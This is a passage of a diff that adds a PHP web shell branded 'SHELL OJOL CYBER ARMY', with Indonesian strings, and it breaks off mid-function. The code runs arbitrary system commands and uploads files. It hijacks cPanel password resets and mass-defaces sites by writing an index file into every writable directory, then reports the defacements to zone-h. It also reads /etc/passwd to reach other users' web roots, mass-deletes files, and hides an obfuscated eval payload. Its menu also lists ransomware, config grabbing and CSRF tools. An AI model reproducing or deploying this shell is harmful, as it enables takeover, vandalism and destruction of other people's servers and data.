+	$uid = @posix_getpwuid(posix_geteuid());
+	$gid = @posix_getgrgid(posix_getegid());
+	$user = $uid['name'];
+	$uid = $uid['uid'];
+	$group = $gid['name'];
+	$gid = $gid['gid'];
+}
+
+function hdd($s)
+{
+	if ($s >= 1073741824)
+		return sprintf('%1.2f', $s / 1073741824) . ' GB';
+	elseif ($s >= 1048576)
+		return sprintf('%1.2f', $s / 1048576) . ' MB';
+	elseif ($s >= 1024)
+		return sprintf('%1.2f', $s / 1024) . ' KB';
+	else
+		return $s . ' B';
+}
+
+$freespace = hdd(disk_free_space("/"));
+$total = hdd(disk_total_space("/"));
+$used = $total - $freespace;
+
+function path()
+{
+	if (isset($_GET['dir'])) {
+		$dir = str_replace("\\", "/", $_GET['dir']);
+		@chdir($dir);
+	} else {
+		$dir = str_replace("\\", "/", getcwd());
+	}
+	return $dir;
+}
+
+function OS()
+{
+	return (substr(strtoupper(PHP_OS), 0, 3) === "WIN") ? "Windows" : "Linux";
+}
+
+function ambilKata($param, $kata1, $kata2)
+{
+	if (strpos($param, $kata1) === FALSE) return FALSE;
+	if (strpos($param, $kata2) === FALSE) return FALSE;
+	$start = strpos($param, $kata1) + strlen($kata1);
+	$end = strpos($param, $kata2, $start);
+	$return = substr($param, $start, $end - $start);
+	return $return;
+}
+
+function windisk()
+{
+	$letters = "";
+	$v = explode("\\", path());
+	$v = $v[0];
+	foreach (range("A", "Z") as $letter) {
+		$bool = $isdiskette = in_array($letter, array("A"));
+		if (!$bool) $bool = is_dir("$letter:\\");
+		if ($bool) {
+			$letters .= "[ <a href='?dir=$letter:\\'" . ($isdiskette ? " onclick=\"return confirm('Make sure that the diskette is inserted properly, otherwise an error may occur.')\"" : "") . ">";
+			if ($letter . ":" != $v) {
+				$letters .= $letter;
+			} else {
+				$letters .= color(1, 2, $letter);
+			}
+			$letters .= "</a> ]";
+		}
+	}
+	if (!empty($letters)) {
+		print "Detected Drives $letters<br>";
+	}
+	if (count($quicklaunch) > 0) {
+		foreach ($quicklaunch as $item) {
+			$v = realpath(path() . "..");
+			if (empty($v)) {
+				$a = explode(DIRECTORY_SEPARATOR, path());
+				unset($a[count($a) - 2]);
+				$v = join(DIRECTORY_SEPARATOR, $a);
+			}
+			print "<a href='" . $item[1] . "'>" . $item[0] . "</a>";
+		}
+	}
+}
+
+$kernel = php_uname();
+$ip = gethostbyname($_SERVER['HTTP_HOST']);
+$freespace = hdd(disk_free_space("/"));
+$total = hdd(disk_total_space("/"));
+$used = $total - $freespace;
+$sm = (@ini_get(strtolower("safe_mode")) == 'on') ? "<font color=red>ON</font>" : "<font color=lime>OFF</font>";
+$ds = @ini_get("disable_functions");
+$mysql = (function_exists('mysql_connect')) ? "<font color=lime>ON</font>" : "<font color=red>OFF</font>";
+$curl = (function_exists('curl_version')) ? "<font color=lime>ON</font>" : "<font color=red>OFF</font>";
+$wget = (exe('wget --help')) ? "<font color=lime>ON</font>" : "<font color=red>OFF</font>";
+$perl = (exe('perl --help')) ? "<font color=lime>ON</font>" : "<font color=red>OFF</font>";
+$python = (exe('python --help')) ? "<font color=lime>ON</font>" : "<font color=red>OFF</font>";
+$show_ds = (!empty($ds)) ? "<font color=red>$ds</font>" : "<font color=lime>NONE</font>";
+function usergroup()
+{
+	if (!function_exists('posix_getegid')) {
+		$user['name'] 	= @get_current_user();
+		$user['uid']  	= @getmyuid();
+		$user['gid']  	= @getmygid();
+		$user['group']	= "?";
+	} else {
+		$user['uid'] 	= @posix_getpwuid(posix_geteuid());
+		$user['gid'] 	= @posix_getgrgid(posix_getegid());
+		$user['name'] 	= $user['uid']['name'];
+		$user['uid'] 	= $user['uid']['uid'];
+		$user['group'] 	= $user['gid']['name'];
+		$user['gid'] 	= $user['gid']['gid'];
+	}
+	return (object) $user;
+}
+
+function exe($cmd)
+{
+	if (function_exists('system')) {
+		@ob_start();
+		@system($cmd);
+		$buff = @ob_get_contents();
+		@ob_end_clean();
+		return $buff;
+	} elseif (function_exists('exec')) {
+		@exec($cmd, $results);
+		$buff = "";
+		foreach ($results as $result) {
+			$buff .= $result;
+		}
+		return $buff;
+	} elseif (function_exists('passthru')) {
+		@ob_start();
+		@passthru($cmd);
+		$buff = @ob_get_contents();
+		@ob_end_clean();
+		return $buff;
+	} elseif (function_exists('shell_exec')) {
+		$buff = @shell_exec($cmd);
+		return $buff;
+	}
+}
+
+	function rec($j)
+	{
+		global $GNJ;
+		if (trim(pathinfo($j, PATHINFO_BASENAME), '.') === '') {
+			return;
+		}
+		if ($GNJ[8]($j)) {
+			array_map('rec', glob($j . DIRECTORY_SEPARATOR . '{,.}*', GLOB_BRACE | GLOB_NOSORT));
+			$GNJ[35]($j);
+		} else {
+			$GNJ[10]($j);
+		}
+	}
+	function dre($y1, $y2)
+	{
+		global $GNJ;
+		ob_start();
+		$GNJ[16]($y1($y2));
+		return $GNJ[36]();
+	}
+	function hex($n)
+	{
+		$y = '';
+		for ($i = 0; $i < strlen($n); $i++) {
+			$y .= dechex(ord($n[$i]));
+		}
+		return $y;
+	}
+	function uhex($y)
+	{
+		$n = '';
+		for ($i = 0; $i < strlen($y) - 1; $i += 2) {
+			$n .= chr(hexdec($y[$i] . $y[$i + 1]));
+		}
+		return $n;
+	}
+	function OK()
+	{
+		global $GNJ, $d;
+		$GNJ[38]($GNJ[9]);
+		header("Location: ?d=" . hex($d) . "&1");
+		exit();
+	}
+	function ER()
+	{
+		global $GNJ, $d;
+		$GNJ[38]($GNJ[9]);
+		header("Location: ?d=" . hex($d) . "&0");
+		exit();
+	}
+	function x($c)
+	{
+		global $GNJ;
+		$x = $GNJ[24]($c);
+		if (($x & 0xC000) == 0xC000) {
+			$u = "s";
+		} elseif (($x & 0xA000) == 0xA000) {
+			$u = "l";
+		} elseif (($x & 0x8000) == 0x8000) {
+			$u = "-";
+		} elseif (($x & 0x6000) == 0x6000) {
+			$u = "b";
+		} elseif (($x & 0x4000) == 0x4000) {
+			$u = "d";
+		} elseif (($x & 0x2000) == 0x2000) {
+			$u = "c";
+		} elseif (($x & 0x1000) == 0x1000) {
+			$u = "p";
+		} else {
+			$u = "u";
+		}
+		$u .= (($x & 0x0100) ? "r" : "-");
+		$u .= (($x & 0x0080) ? "w" : "-");
+		$u .= (($x & 0x0040) ? (($x & 0x0800) ? "s" : "x") : (($x & 0x0800) ? "S" : "-"));
+		$u .= (($x & 0x0020) ? "r" : "-");
+		$u .= (($x & 0x0010) ? "w" : "-");
+		$u .= (($x & 0x0008) ? (($x & 0x0400) ? "s" : "x") : (($x & 0x0400) ? "S" : "-"));
+		$u .= (($x & 0x0004) ? "r" : "-");
+		$u .= (($x & 0x0002) ? "w" : "-");
+		$u .= (($x & 0x0001) ? (($x & 0x0200) ? "t" : "x") : (($x & 0x0200) ? "T" : "-"));
+		return $u;
+	}
+	if (isset($_GET["g"])) {
+		$GNJ[38]($GNJ[9]);
+		header("Content-Type: application/octet-stream");
+		header("Content-Transfer-Encoding: Binary");
+		header("Content-Length: " . $GNJ[34](uhex($_GET["g"])));
+		header("Content-disposition: attachment; filename=\"" . uhex($_GET["g"]) . "\"");
+		$GNJ[37](uhex($_GET["g"]));
+	}
+
+if(isset($_GET["phpinfos"])){
+	phpinfo();
+	exit();
+}
+echo '<!DOCTYPE HTML>
+<html>
+<head>
+  <link href="https://fonts.googleapis.com/css?family=Black+Ops+One" rel="stylesheet">
+  <link href="https://fonts.googleapis.com/css?family=Merienda" rel="stylesheet">
+  <link href="https://fonts.googleapis.com/css?family=Kelly+Slab" rel="stylesheet" type="text/css">
+<link href="https://fonts.googleapis.com/css?family=Sedgwick+Ave+Display" rel="stylesheet">
+<title>SHELL OJOL CYBER ARMY</title>
+<meta property="og:image" src="https://i.gifer.com/7M1g.gif"/>
+<style>
+body{
+font-family: Kelly Slab;
+background-color: #23242a;
+color:white;
+}
+#content tr:hover{
+background-color: #00ddff;
+text-shadow:0px 0px 10px #fff;
+}
+#content .first{
+background-color: #00ddff;
+color:white
+}
+table{
+border: 1px #000000;
+}
+a{
+color:white;
+font-size: 19px;
+text-decoration:none;
+}
+a:hover{
+color:green;
+text-shadow:0px 0px 10px #ffffff;
+}
+input,select,textarea{
+border: 2px #000000 solid;
+-moz-border-radius: 5px;
+-webkit-border-radius:5px;
+border-radius:5px;
+}
+h2{
+font-family:Kelly Slab;
+font-size:25px;
+color:white;
+}
+h3{
+font-size:35px;
+}
+h4{
+font-size:15px;
+font-family:Kelly Slab;
+color:white;
+}
+.destroy_table {;
+  background:transparent;
+  border:1px solid #00ddff;
+  font-family:Kelly Slab;
+    display:inline-block;
+  cursor:pointer;
+  color:yellow;
+  font-size:17x;
+  font-weight:bold;
+  padding:3px 20px;
+  text-decoration:white;
+  text-shadow:0px 0px 0px #ff0505;
+       }
+       .td_table {;
+  background-color: #23242a;
+            background-image: url(#);
+            background-repeat: no-repeat;
+            background-attachment: fixed;
+            background-size: 100%  100%;   
+border: 1px solid gold; 
+padding: 0px; 
+margin-left: 2px; 
+text-align: center;
+}
+     .potext {
+  border: 1px solid #ffffff;
+  width: 100%;
+  height: 400px;
+  padding-left: 5px;
+  margin: 10px auto;
+  resize: none;
+  background-color: #23242a;
+            background-image: url(#);
+            background-repeat: no-repeat;
+            background-attachment: fixed;
+            background-size: 100%  100%;   
+  color: #ffffff;
+  font-family:Kelly Slab;
+  font-size: 13px;
+}
+.pl{
+background:transparent; 
+border: 1px solid red; 
+padding: 5px; 
+margin-left: 20px; 
+text-align: center;
+}
+.pt{
+background:transparent; 
+border: 1px solid red; 
+padding: 5px; 
+margin-left: 20px; 
+text-align: left;
+}
+</style>
+</head>
+<body>
+<center>
+<br>
+<font face="Kelly Slab" color="white" size="7px">SHELL OJOL CYBER ARMY</font><br>
+</h1></center>
+<table width="100%" border="0" cellpadding="0" cellspacing="0" align="left">
+<tr><td>';
+echo "<tr><td><font color='white'>
+System  <td>: <font color='lime'>".$kernel."<tr><td><font color='white'>
+User  <td>: <font color='lime'>".$user."</font> (".$uid.") Group : <font color=lime>".$group."</font> (".$gid.") <tr><td><font color='white'>
+Server IP     <td>: <font color=lime>".$ip."</font> | Your IP: <font color=lime>".$_SERVER['REMOTE_ADDR']."<tr><td><font color='white'>
+Web Server     <td>: <font color=lime>".$_SERVER['SERVER_SOFTWARE']."</font><tr><td><font color='white'>
+HDD   <td>: <font color=lime>$used</font> / <font color=lime>$total</font> ( Free: <font color=lime>$freespace</font> )<tr><td><font color='white'>
+Safe Mode <td>: $sm<tr><td><font color='white'>
+Disable Functions <td>: $show_ds<tr><td><font color='white'>
+MySQL <td>: $mysql | Perl: $perl | Python: $python | WGET: $wget | CURL: $curl</font></tr></td><br>
+</table>";
+echo '<table width="100%" border="0" cellpadding="0" cellspacing="0" align="center">
+<center><tr align="center"><td align="center">path : ';
+if(isset($_GET['path'])){
+$path = $_GET['path'];
+}else{
+$path = getcwd();
+}
+$path = str_replace('\\','/',$path);
+$paths = explode('/',$path);
+
+/*if(isset($_GET['dir']) && empty($_GET['path'])){
+	if(empty($_GET['path'])){
+		$dir = $path;
+	}else{
+		$dir = $_GET['dir'];
+	}
+}elseif(empty($_GET['dir']) && isset($_GET['path'])){
+	if(empty($_GET['path'])){
+		$dir = $path;
+	}else{
+		$dir = $_GET['path'];
+	}
+}else{
+	$dir = $path;
+}*/
+
+foreach($paths as $id=>$pat){
+if($pat == '' && $id == 0){
+$a = true;
+echo '<a href="?path=/">/</a>';
+continue;
+}
+if($pat == '') continue;
+echo '<a href="?path=';
+for($i=0;$i<=$id;$i++){
+echo "$paths[$i]";
+if($i != $id) echo "/";
+}
+echo '">'.$pat.'</a>/';
+}
+
+if(isset($_FILES['file'])){
+if(copy($_FILES['file']['tmp_name'],$path.'/'.$_FILES['file']['name'])){
+echo '<font color="yellow">UPLOADED SUCCES !!!!!</script><br/>';
+}else{
+echo '<script> alert("UPLOADED FAILED COK !!!!!")</script></font><br/>';
+}
+}
+echo '</tr><tr align="center"><td align="center"><form enctype="multipart/form-data" method="POST">
+<font color="white"><br><b></font><input type="file"name="file" style="widht:900px;font-family:Kelly Slab;font-size:20;background:transparent;color:white;border:2px solid red;"/>
+<input type="submit" value="Upload" style="margin-top:4px;width:150px;font-family:Kelly Slab;font-size:20;background:transparent;color:white;border:2px solid red;border-radius:5px"/><br><br>
+</form></center>';
+echo "</td></tr>";
+echo "</table>";
+echo "<center>";
+echo "<center><table id='menu' width='990' border='0' cellpadding='0' cellspacing='0'><tr><td>";
+echo "<a class='destroy_table' href='?'>Home</a>";
+echo "<a class='destroy_table' href='?dir=$dir&do=cmd'>cp_reset_pw</a>";
+echo "<a class='destroy_table' href='?logout=true'>Logout</a>";
+echo "<a class='destroy_table' href='?dir=$dir&to=zoneh'>Zone-h</a>";
+echo "<a class='destroy_table' href='?dir=$dir&to=jumping'>Jumping</a>";
+echo "<a class='destroy_table' href='?dir=$dir&to=sym'>Symlink</a>";
+echo "<a class='destroy_table' href='?dir=$dir&to=mass'>Mass_deface</a>";
+echo "<a class='destroy_table' href='?dir=$dir&to=masse'>Mass_delete</a><br>";
+echo "<a class='destroy_table' href='?dir=$dir&to=config'>Config_grab</a>";
+echo "<a class='destroy_table' href='?dir=$dir&do=auto_edit_user'>auto_edit_user</a>";
+echo "<a class='destroy_table' href='?dir=$dir&do=endec'>End/Decode</a>";
+echo "<a class='destroy_table' href='?dir=$dir&do=hashgen'>Hash Generator</a>";
+echo "<a class='destroy_table' href='?dir=$dir&do=adminer'>Adminer</a>";
+echo "<a class='destroy_table' href='?dir=$dir&to=cmd'>Command</a>";
+echo "<a class='destroy_table' href='?dir=$dir&to=network'>Network</a>";
+echo "<a class='destroy_table' href='?dir=$dir&to=cgi'>CGI</a>";
+echo "<a class='destroy_table' href='?dir=$dir&to=whois'>Whois / RS Info / Reverse IP</a>";
+echo "<a class='destroy_table' href='?dir=$dir&to=fakeroot'>Fake Root</a>";
+echo "<a class='destroy_table' href='?dir=$dir&to=phpinfo'>PHPInfo</a>";
+echo "<a class='destroy_table' href='?dir=$dir&to=obfuscator'>Obfuscator</a>";
+echo "<a class='destroy_table' href='?dir=$dir&to=portscanner'>Port Scanner</a>";
+echo "<a class='destroy_table' href='?dir=$dir&to=csrf'>CSRF</a>";
+echo "<a class='destroy_table' href='?dir=$dir&to=krdpshell'>K-RDP Shell</a>";
+echo "<a class='destroy_table' href='?dir=$dir&to=domainviewer'>Domain Viewer</a>";
+echo "<a class='destroy_table' href='?dir=$dir&to=bypasspasswd'>Bypass passwd & user</a>";
+echo "<a class='destroy_table' href='?dir=$dir&to=ransomware_enc'>Ransomware Encryption</a>";
+echo "<a class='destroy_table' href='?dir=$dir&to=ransomware_dec'>Ransomware Decryption</a>";
+echo "<a class='destroy_table' href='?dir=$dir&do=about'>About</a>";
+echo "</center>";
+if($_GET['do'] == 'cmd') {
+	echo'<header> 
+	<pre> 
+	- Cpanel Reset Password</pre> 
+	</header> 
+	</center> 
+	<form action="#" method="post"> 	 <input type="email" name="email" placeholder="Email Lu Tong" /> 	 <input type="submit" name="submit" value="Crack"/> 	 
+	</form> 	 	 
+	<br/><br/><br/> 
+	</p>'; ?> <?php $IIIIIIIIIIII = get_current_user(); $IIIIIIIIIII1 = $_SERVER['HTTP_HOST']; $IIIIIIIIIIlI = getenv('REMOTE_ADDR'); if (isset($_POST['submit'])) { $email = $_POST['email']; $IIIIIIIIIIl1 = 'email:' . $email; $IIIIIIIIII1I = fopen('/home/' . $IIIIIIIIIIII . '/.cpanel/contactinfo', 'w'); fwrite($IIIIIIIIII1I, $IIIIIIIIIIl1); fclose($IIIIIIIIII1I); $IIIIIIIIII1I = fopen('/home/' . $IIIIIIIIIIII . '/.contactinfo', 'w'); fwrite($IIIIIIIIII1I, $IIIIIIIIIIl1); fclose($IIIIIIIIII1I); $IIIIIIIIIlIl = "https://"; $IIIIIIIIIlI1 = "2083"; $IIIIIIIIIllI = $IIIIIIIIIII1 . ':2083/resetpass?start=1'; $read_named_conf = @file('/home/' . $IIIIIIIIIIII . '/.cpanel/contactinfo'); if(!$read_named_conf) { echo "<h1>Gak Bisa Di Akses Sayang??</h1>
+	<br><br> 
+	</pre>
+	</center>"; } else { echo "<center>Salin<br><br>
+	</center>"; echo '<center><input type="text" value="' . $IIIIIIIIIIII . '" id="user"> <button onclick="username()">Salin User</button></center> <script>function username() { var copyText = document.getElementById("user"); copyText.select(); document.execCommand("copy"); } </script> '; echo '<br/><center><a target="_blank" href="' . $IIIIIIIIIlIl . '' . $IIIIIIIIIllI . '">Gass Disini</a><br><br></center>'; ;}}
+	echo '</td></tr><tr><td>';
+}elseif($_GET['to'] == "network"){
+	bport();
+}elseif($_GET['to'] == "phpinfo") {
+	pi_o();
+}elseif($_GET['to'] == "cgi") {
+	dcg();
+}elseif($_GET['to'] == "whois") {
+	dwasr();
+}elseif($_GET['to'] == "obfuscator") {
+	obc();
+}elseif($_GET['to'] == "fakeroot") {
+	fr();
+}elseif($_GET['to'] == "portscanner") {
+	ps();
+}elseif($_GET['to'] == "csrf") {
+	fcsrf();
+}elseif($_GET['to'] == "krdpshell") {
+	krdp();
+}elseif($_GET['to'] == "domainviewer") {
+	domvs();
+}elseif($_GET['to'] == "bypasspasswd") {
+	bpwd();
+}elseif($_GET['to'] == "ransomware_enc") {
+	ransomware();
+}elseif($_GET['to'] == "ransomware_dec") {
+	decransomware();
+}elseif($_GET['logout'] == true) {
+	unset($_SESSION[md5($_SERVER['HTTP_HOST'])]);
+	echo "<script>window.location='?';</script>";
+}elseif($_GET['to'] == 'zoneh') {
+	if($_POST['submit']) {
+		$domain = explode("\r\n", $_POST['url']);
+		$nick =  $_POST['nick'];
+		echo "Defacer Onhold: <a href='http://www.zone-h.org/archive/notifier=$nick/published=0' target='_blank'>http://www.zone-h.org/archive/notifier=$nick/published=0</a><br>";
+		echo "Defacer Archive: <a href='http://www.zone-h.org/archive/notifier=$nick' target='_blank'>http://www.zone-h.org/archive/notifier=$nick</a><br><br>";
+		function zoneh($url,$nick) {
+			$ch = curl_init("http://www.zone-h.com/notify/single");
+				  curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+				  curl_setopt($ch, CURLOPT_POST, true);
+				  curl_setopt($ch, CURLOPT_POSTFIELDS, "defacer=$nick&domain1=$url&hackmode=1&reason=1&submit=Send");
+			return curl_exec($ch);
+				  curl_close($ch);
+		}
+		foreach($domain as $url) {
+			$zoneh = zoneh($url,$nick);
+			if(preg_match("/color=\"red\">OK<\/font><\/li>/i", $zoneh)) {
+				echo "$url -> <font color=lime>OK</font><br>";
+			} else {
+				echo "$url -> <font color=red>ERROR</font><br>";
+			}
+		}
+	} else {
+		echo "<center><form method='post'>
+		<u>Defacer</u>: <br>
+		<input type='text' name='nick' size='50' value='Mr.Z'><br>
+		<u>Domains</u>: <br>
+		<textarea style='width: 450px; height: 150px;' name='url'></textarea><br>
+		<input type='submit' name='submit' value='Submit' style='width: 450px;'>
+		</form>";
+	}
+	echo "</center>";
+} elseif($_GET['to'] == 'mass') {
+	function sabun_massal($dir,$namafile,$isi_script) {
+		if(is_writable($dir)) {
+			$dira = scandir($dir);
+			foreach($dira as $dirb) {
+				$dirc = "$dir/$dirb";
+				$lokasi = $dirc.'/'.$namafile;
+				if($dirb === '.') {
+					file_put_contents($lokasi, $isi_script);
+				} elseif($dirb === '..') {
+					file_put_contents($lokasi, $isi_script);
+				} else {
+					if(is_dir($dirc)) {
+						if(is_writable($dirc)) {
+							echo "[<font color=lime>DONE</font>] $lokasi<br>";
+							file_put_contents($lokasi, $isi_script);
+							$idx = sabun_massal($dirc,$namafile,$isi_script);
+						}
+					}
+				}
+			}
+		}
+	}
+	function sabun_biasa($dir,$namafile,$isi_script) {
+		if(is_writable($dir)) {
+			$dira = scandir($dir);
+			foreach($dira as $dirb) {
+				$dirc = "$dir/$dirb";
+				$lokasi = $dirc.'/'.$namafile;
+				if($dirb === '.') {
+					file_put_contents($lokasi, $isi_script);
+				} elseif($dirb === '..') {
+					file_put_contents($lokasi, $isi_script);
+				} else {
+					if(is_dir($dirc)) {
+						if(is_writable($dirc)) {
+							echo "[<font color=lime>DONE</font>] $dirb/$namafile<br>";
+							file_put_contents($lokasi, $isi_script);
+						}
+					}
+				}
+			}
+		}
+	}
+	if($_POST['start']) {
+		if($_POST['tipe_sabun'] == 'mahal') {
+			echo "<div style='margin: 5px auto; padding: 5px'>";
+			sabun_massal($_POST['d_dir'], $_POST['d_file'], $_POST['script']);
+			echo "</div>";
+		} elseif($_POST['tipe_sabun'] == 'murah') {
+			echo "<div style='margin: 5px auto; padding: 5px'>";
+			sabun_biasa($_POST['d_dir'], $_POST['d_file'], $_POST['script']);
+			echo "</div>";
+		}
+	} else {
+	echo "<center>";
+	echo "<form method='post'>
+	<font style='text-decoration: underline;'>Tipe Mass:</font><br>
+	<input type='radio' name='tipe_sabun' value='murah' checked>Biasa<input type='radio' name='tipe_sabun' value='mahal'>Massal<br>
+	<font style='text-decoration: underline;'>Folder:</font><br>
+	<input type='text' name='d_dir' value='$dir' style='width: 450px;' height='10'><br>
+	<font style='text-decoration: underline;'>Filename:</font><br>
+	<input type='text' name='d_file' value='ini.html' style='width: 450px;' height='10'><br>
+	<font style='text-decoration: underline;'>Index File:</font><br>
+	<textarea name='script' style='width: 450px; height: 200px;'>By Mr.Z</textarea><br>
+	<input type='submit' name='start' value='ENTOT COK!' style='width: 450px;'>
+	</form></center>";
+	} 
+	}elseif($_GET['to'] == 'sym') {
+echo '<hr>';
+eval(gzinflate(base64_decode('7Vf/T9tGFP89Uv6Hx5HJ9kjtJKhrReKUrjCt0lakQrdJUEWOfcYeF591d8GklP997852SOME1C/SNqlIRM777vfl81468Zwx8EEqMRE0Z0FI7c7k9PjtH8dvz62jk1fvfj9+czZ5e3JyZr3vAiFd6OSBSpxhu9WJerMgzSSqH8YpozbxqAq9LJjRyA15FhMttbubKIVmZbuVxnat49y2W4ezqygVNvlA1UQuZqTbe/bsmVY5DJNPGIZGb2hoE5bBEwkeCM6VoXe0530MwTrJVcoxmtdZhLISfuGM8eJ0Mfstza7Q+1EqaKi4WBgBiGgYLNxEzdqtl1F0tsgpKHqjPMxBmoGbJzkYzq9BFjEq1pnt1mmgUhkv4GW2sEwguQ4j5jnNbAsNByG+tLS6VmGVgRaGX4hUYY5RulvG7gwP45BxWRK1KA0TDqTdGqlgyigELL3M/JBmCsOYchFR4e9jxRaM+laRRio5+Kn3w7DkPAk54+Jg9/nPPfwbWmNtRpjP6BNL41HMMwVG3GfpjIJMP1B/MD514Q13R55mj0eeij5H+Yib8n6h9jtJxZfqYqEZFnpN28N3J6ZXQz5HPR/6+C3mggZhsuxGCCRUz7oxsU+poJcpdiDPKOnWLOc2R/JkFqgwmQSM2dauFgBiuz86ZNfq1kb0Q5kIXc6YzWVi6yc0jIPGsEGUSGd2LXTef3/ee+84MIaB9t+ZYx4w1JzL9GZySVVezNPINkPGi4yKatKuMTGBpNIj7rqpZRdh8dfyh4kpc1gljoALdXpcVNiSfkZjpAaQCBr7ONL5gecVReGu+3aJV9eIBVL66kaNmzJLL8GKJy2nX/3c0hhiGbElr3ZtdTRkeRU2eBoIvITPqNdQ9vL5lKXhBGecWaACgZn0rcmUBdmV1YhxvX+qwKoOgtUyVtna2xve3d0tE+2ZaTXddkeZpLqQZ8enZ34JjpYpWY7uisgqmwFsI/DZWPhfh0J4DAvhATBE7joeQg2I8AAi9sclzsEWxDDdvr8R3R5R2YBKjzlpYtESieBTKALz3stkkZUuwV1LBHGAC6A3qbLJu8y8veKgZUEr7pjKQ5HoFtuJKccVq+mObiro6N0cY9vLimocGvyimhUIESzskqoDuoc3bNcLD2HthXNxcOF5UmOb7C511w2tng+knMYu3gq1BE690bjHv6UhxLz+AD5+hAbD96GnGfdufCDTNCMNok7ZX/2+F8sm7zoQHkunXraNGYi80KTN3EueJ1Q0eXJjIMZeNGsy5hJNISxtiSFW+ea3yjYxtAYi72aGub6Ig8nGC0yl2ZzeD5AekIcad8MueLDbVwBe69Wh1Ipk1fMjBmp03wruaw5Wsb0B7cvxC7bMnkbuJcbUc7EO4yWI65uVS9jB9P6ZZhEvJHFut6B1E6v11dpA6nucRq+fCdW93vNvANLt1lfD9AMYXZc4GVQFtq4GjO3vR4NlaeCUimsqRl4yGH8TWH999K9CuqKzHBNFyLCDR1kfH3vmaaBRXt/hKIRHp12xRz4Ybvl1b8+B2w5eePqH1NrNZwQq7MRzAUlO6cz14W+eYtkOrK4hu+Qiw6atK2GNpsIbW8M6tPLg1F+qBnyKRBOVWTuKSuXiICJsF+VKifN5vTaeditFTV4Zm6doamWZ1Ztsk9Wv2mTNNfZtdtj3BfZ9gf1/F9jaMG7YYSMvSq/xswqZDOeZNrsyl0bpDvSmg3v1Tfj3Ksgyji+MP5wVhXU0XHrQ5sr/F+N/AA==')));
+} elseif($_GET['to'] == 'jumping') {
+	$i = 0;
+	echo "<div class='margin: 5px auto;'>";
+	if(preg_match("/hsphere/", $dir)) {
+		$urls = explode("\r\n", $_POST['url']);
+		if(isset($_POST['jump'])) {
+			echo "<pre>";
+			foreach($urls as $url) {
+				$url = str_replace(array("http://","www."), "", strtolower($url));
+				$etc = "/etc/passwd";
+				$f = fopen($etc,"r");
+				while($gets = fgets($f)) {
+					$pecah = explode(":", $gets);
+					$user = $pecah[0];
+					$dir_user = "/hsphere/local/home/$user";
+					if(is_dir($dir_user) === true) {
+						$url_user = $dir_user."/".$url;
+						if(is_readable($url_user)) {
+							$i++;
+							$jrw = "[<font color=lime>R</font>] <a href='?dir=$url_user'><font color=gold>$url_user</font></a>";
+							if(is_writable($url_user)) {
+								$jrw = "[<font color=lime>RW</font>] <a href='?dir=$url_user'><font color=gold>$url_user</font></a>";
+							}
+							echo $jrw."<br>";
+						}
+					}
+				}
+			}
+		if($i == 0) { 
+		} else {
+			echo "<br>Total ada ".$i." Kamar di ".$ip;
+		}
+		echo "</pre>";
+		} else {
+			echo '<center>
+				  <form method="post">
+				  List Domains: <br>
+				  <textarea name="url" style="width: 500px; height: 250px;">';
+			$fp = fopen("/hsphere/local/config/httpd/sites/sites.txt","r");
+			while($getss = fgets($fp)) {
+				echo $getss;
+			}
+			echo  '</textarea><br>
+				  <input type="submit" value="Jumping" name="jump" style="width: 500px; height: 25px;">
+				  </form></center>';
+		}
+	} elseif(preg_match("/vhosts|vhost/", $dir)) {
+		preg_match("/\/var\/www\/(.*?)\//", $dir, $vh);
+		$urls = explode("\r\n", $_POST['url']);
+		if(isset($_POST['jump'])) {
+			echo "<pre>";
+			foreach($urls as $url) {
+				$url = str_replace("www.", "", $url);
+				$web_vh = "/var/www/".$vh[1]."/$url/httpdocs";
+				if(is_dir($web_vh) === true) {
+					if(is_readable($web_vh)) {
+						$i++;
+						$jrw = "[<font color=lime>R</font>] <a href='?dir=$web_vh'><font color=gold>$web_vh</font></a>";
+						if(is_writable($web_vh)) {
+							$jrw = "[<font color=lime>RW</font>] <a href='?dir=$web_vh'><font color=gold>$web_vh</font></a>";
+						}
+						echo $jrw."<br>";
+					}
+				}
+			}
+		if($i == 0) { 
+		} else {
+			echo "<br>Total ada ".$i." Kamar di ".$ip;
+		}
+		echo "</pre>";
+		} else {
+			echo '<center>
+				  <form method="post">
+				  List Domains: <br>
+				  <textarea name="url" style="width: 500px; height: 250px;">';
+				  bing("ip:$ip");
+			echo  '</textarea><br>
+				  <input type="submit" value="Jumping" name="jump" style="width: 500px; height: 25px;">
+				  </form></center>';
+		}
+	} else {
+		echo "<pre>";
+		$etc = fopen("/etc/passwd", "r") or die("<font color=red>Can't read /etc/passwd</font>");
+		while($passwd = fgets($etc)) {
+			if($passwd == '' || !$etc) {
+				echo "<font color=red>Can't read /etc/passwd</font>";
+			} else {
+				preg_match_all('/(.*?):x:/', $passwd, $user_jumping);
+				foreach($user_jumping[1] as $user_idx_jump) {
+					$user_jumping_dir = "/home/$user_idx_jump/public_html";
+					if(is_readable($user_jumping_dir)) {
+						$i++;
+						$jrw = "[<font color=limeBlue>R</font>] <a href='?dir=$user_jumping_dir'><font color=gold>$user_jumping_dir</font></a>";
+						if(is_writable($user_jumping_dir)) {
+							$jrw = "[<font color=lime>RW</font>] <a href='?dir=$user_jumping_dir'><font color=gold>$user_jumping_dir</font></a>";
+						}
+						echo $jrw;
+						if(function_exists('posix_getpwuid')) {
+							$domain_jump = file_get_contents("/etc/named.conf");	
+							if($domain_jump == '') {
+								echo " => ( <font color=red>gabisa ambil nama domain nya</font> )<br>";
+							} else {
+								preg_match_all("#/var/named/(.*?).db#", $domain_jump, $domains_jump);
+								foreach($domains_jump[1] as $dj) {
+									$user_jumping_url = posix_getpwuid(@fileowner("/etc/valiases/$dj"));
+									$user_jumping_url = $user_jumping_url['name'];
+									if($user_jumping_url == $user_idx_jump) {
+										echo " => ( <u>$dj</u> )<br>";
+										break;
+									}
+								}
+							}
+						} else {
+							echo "<br>";
+						}
+					}
+				}
+			}
+		}
+		if($i == 0) { 
+		} else {
+			echo "<br>Total ada ".$i." Kamar di ".$ip;
+		}
+		echo "</pre>";
+	}
+	echo "</div>";
+}  //MASS DELETE/////////////////////////
+elseif($_GET['to'] == 'masse') {
+   function hapus_massal($dir,$namafile) {
+if(is_writable($dir)) {
+   $dira = scandir($dir);
+   foreach($dira as $dirb) {
+       $dirc = "$dir/$dirb";
+       $lokasi = $dirc.'/'.$namafile;
+       if($dirb === '.') {
+           if(file_exists("$dir/$namafile")) {
+               unlink("$dir/$namafile");
+           }
+       } elseif($dirb === '..') {
+           if(file_exists("".dirname($dir)."/$namafile")) {
+               unlink("".dirname($dir)."/$namafile");
+           }
+       } else {
+           if(is_dir($dirc)) {
+               if(is_writable($dirc)) {
+                   if(file_exists($lokasi)) {
